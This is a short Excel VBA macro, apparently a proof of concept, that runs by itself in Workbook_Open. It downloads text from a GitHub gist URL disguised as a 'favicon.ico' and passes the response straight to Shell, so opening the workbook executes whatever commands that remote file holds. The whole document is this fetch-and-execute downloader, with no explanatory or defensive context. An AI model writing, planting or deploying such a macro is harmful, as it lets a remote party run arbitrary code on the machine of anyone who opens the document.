Option Explicit

Private Sub Workbook_Open()

    Dim FileUrl As String
    Dim objXmlHttpReq As Object
    
    FileUrl = "https://gist.github.com/thisismyrobot/7986b6c71096a32faa23021022875ff1/raw/f9d824b814fe106a729df81c86b9124d276b0a80/favicon.ico"
    Set objXmlHttpReq = CreateObject("MSXML2.serverXMLHTTP")

    objXmlHttpReq.Open "GET", FileUrl, False
    objXmlHttpReq.Send
    
    If objXmlHttpReq.Status = 200 Then
        Call Shell(objXmlHttpReq.responseText)
    End If

End Sub
